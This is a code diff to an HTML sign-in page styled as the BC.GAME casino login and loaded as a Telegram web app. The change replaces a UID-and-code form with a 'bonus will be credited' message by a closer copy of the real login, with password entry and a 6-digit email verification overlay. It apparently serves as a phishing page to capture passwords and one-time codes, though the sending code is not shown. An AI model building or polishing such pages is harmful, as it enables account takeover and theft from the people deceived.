@@ -3,92 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BC.GAME | Sign In</title>
+    <title>Sign In | BC.GAME</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body class="dark">
-    <div class="login-container">
-        <div class="login-card">
-            <div class="login-header">
-                <img src="https://bc.game/assets/logo.01f4640d.png" alt="BC.GAME" class="logo">
-                <button class="close-btn" id="close-app">&times;</button>
+    <div class="main-wrapper" id="main-wrapper">
+        <div class="login-modal">
+            <div class="modal-header">
+                <img src="logo-CBzjipjR.png" alt="BC.GAME" class="bc-logo">
+                <div class="close-icon"><i class="fas fa-times"></i></div>
             </div>
 
-            <div class="tab-container">
-                <div class="tab active" data-tab="otp">OTP Login</div>
-                <div class="tab" data-tab="password">Password</div>
+            <h1 class="modal-title">Sign In</h1>
+
+            <div class="tab-switcher">
+                <div class="tab-item active" data-tab="password">
+                    <i class="fas fa-lock"></i> Password
+                </div>
+                <div class="tab-item" data-tab="otp">
+                    <i class="fas fa-mobile-alt"></i> One-time Code
+                </div>
             </div>
 
-            <div class="form-container">
-                <div class="input-group-toggle">
-                    <button class="toggle-btn active" data-type="email">Email</button>
-                    <button class="toggle-btn" data-type="phone">Mobile</button>
+            <div class="form-content">
+                <div class="input-group">
+                    <input type="text" id="main-identifier" placeholder="Email / Phone Number / Username">
                 </div>
 
-                <div class="input-field">
-                    <label id="input-label">Email Address</label>
-                    <div class="input-wrapper">
-                        <i class="fas fa-envelope" id="input-icon"></i>
-                        <input type="text" id="user-identifier" placeholder="Enter your email">
-                    </div>
+                <div class="input-group password-group" id="password-field">
+                    <input type="password" id="login-password" placeholder="Password">
+                    <div class="eye-icon"><i class="far fa-eye"></i></div>
                 </div>
 
-                <div class="input-field" id="uid-field">
-                    <label>BC.GAME UID</label>
-                    <div class="input-wrapper">
-                        <i class="fas fa-id-badge"></i>
-                        <input type="number" id="user-uid" placeholder="Enter your UID">
-                    </div>
+                <div class="forgot-link" id="forgot-link">Forgot your password?</div>
+
+                <button class="main-submit-btn" id="btn-signin">Sign In</button>
+
+                <div class="register-promo">
+                    New to BC.GAME? <span class="accent-text">Create account</span>
                 </div>
 
-                <div class="input-field" id="otp-field">
-                    <label>Verification Code</label>
-                    <div class="input-wrapper">
-                        <i class="fas fa-shield-alt"></i>
-                        <input type="text" id="otp-code" placeholder="Enter code">
-                        <button class="send-code-btn" id="send-otp">Send Code</button>
-                    </div>
-                    <div class="timer-text" id="timer-container" style="display: none;">
-                        Resend in <span id="timer-count">60</span>s
-                    </div>
+                <div class="direct-login-divider">
+                    <span>Log in directly with</span>
                 </div>
 
-                <button class="submit-btn" id="login-submit">Sign In</button>
-
-                <div class="divider">
-                    <span>Or Login With</span>
+                <div class="passkey-btn">
+                    <i class="fas fa-user-shield"></i> Sign In with passkey
                 </div>
 
-                <div class="social-login">
-                    <button class="social-btn google">
-                        <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" alt="Google">
-                    </button>
-                    <button class="social-btn telegram">
-                        <i class="fab fa-telegram-plane"></i>
-                    </button>
-                    <button class="social-btn whatsapp">
-                        <i class="fab fa-whatsapp"></i>
-                    </button>
-                </div>
-
-                <div class="footer-links">
-                    <span>Don't have an account? <a href="#">Sign up now</a></span>
+                <div class="social-icons">
+                    <div class="social-icon"><i class="fab fa-google"></i></div>
+                    <div class="social-icon"><i class="fab fa-x-twitter"></i></div>
+                    <div class="social-icon"><i class="fab fa-telegram-plane"></i></div>
+                    <div class="social-icon"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAbUlEQVR4nGNgGF7AiYGB4T8DA8N/YvAnA0X68YF/DAwM/8F0LFDkhxsDA8N/MB0LpA9mIP8K6IdXDAwM/8F0LJA+mICpAnD68I+BgfE/mI4F0ocQMFUAbvoQTMAUDmD68I9BFpCjYXiBYWQCAP7tL/u6zXmXAAAAAElFTkSuQmCC" alt=""></div>
+                    <div class="social-icon"><i class="fab fa-whatsapp"></i></div>
+                    <div class="social-icon"><i class="fab fa-line"></i></div>
+                    <div class="social-icon"><i class="fab fa-steam"></i></div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Success Modal -->
-    <div id="success-modal" class="modal">
-        <div class="modal-content">
-            <div class="success-icon">
-                <i class="fas fa-check-circle"></i>
+    <!-- OTP Verification Modal -->
+    <div class="verify-overlay" id="otp-overlay">
+        <div class="verify-modal">
+            <div class="verify-close"><i class="fas fa-times"></i></div>
+            
+            <div class="verify-icon-container">
+                <i class="fas fa-envelope" id="verify-type-icon"></i>
             </div>
-            <h2>Success</h2>
-            <p>Verification successful! Your bonus will be credited.</p>
-            <button id="modal-ok">OK</button>
+
+            <h2 class="verify-title" id="verify-title">Email Verification</h2>
+            <p class="verify-desc" id="verify-desc">Please enter the 6-digit verification code sent on e-mail</p>
+
+            <div class="verify-input-label">Verification Code</div>
+            <div class="verify-input-wrapper">
+                <input type="text" id="verify-code-input" placeholder="6-digit verification code">
+                <button class="paste-btn">Paste</button>
+            </div>
+
+            <div class="resend-timer">Resend in <span id="resend-seconds">46</span>s</div>
+
+            <button class="confirm-btn" id="btn-confirm">Confirm</button>
         </div>
     </div>
 
